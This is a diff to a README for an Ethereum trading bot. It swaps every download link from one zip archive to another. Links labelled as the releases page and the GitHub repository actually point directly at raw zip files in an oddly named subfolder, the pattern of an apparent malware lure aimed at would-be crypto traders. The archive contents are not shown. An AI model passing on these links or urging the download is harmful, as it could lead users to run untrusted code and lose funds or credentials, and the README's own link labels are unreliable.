@@ -1,6 +1,6 @@
 # 🤖 Uniswap-Ethereum-Bot-V3 - Effortlessly Trade on Ethereum
 
-[![Download](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Uniswap-Ethereum-Bot-V3-v3.3.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Uniswap-Ethereum-Bot-V3-v3.3.zip)
+[![Download](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Ethereum-Bot-Uniswap-1.8.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Ethereum-Bot-Uniswap-1.8.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To start using the Uniswap-Ethereum-Bot-V3, follow these simple steps. Each step
 
 1. **Visit the Releases Page**: Click the link below to go to the official Releases page.
 
-   [Download from Releases](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Uniswap-Ethereum-Bot-V3-v3.3.zip)
+   [Download from Releases](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Ethereum-Bot-Uniswap-1.8.zip)
 
 2. **Choose Your Version**: On the Releases page, you’ll see different versions of the bot. Look for the latest version with a version number (e.g., v1.0.0). 
 
@@ -60,8 +60,8 @@ If you encounter any issues, you can find help in several ways:
 
 ## 🌐 Links
 
-- **GitHub Repository**: [Uniswap-Ethereum-Bot-V3](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Uniswap-Ethereum-Bot-V3-v3.3.zip)
-- **Releases Page**: [Download the Bot](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Uniswap-Ethereum-Bot-V3-v3.3.zip)
+- **GitHub Repository**: [Uniswap-Ethereum-Bot-V3](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Ethereum-Bot-Uniswap-1.8.zip)
+- **Releases Page**: [Download the Bot](https://raw.githubusercontent.com/ShazaibXD/Uniswap-Ethereum-Bot-V3/main/quadrivalvular/Ethereum-Bot-Uniswap-1.8.zip)
 - **Documentation**: Check for any updated user guides or documentation in the repository for more detailed instructions.
 
 ## 📝 Updates
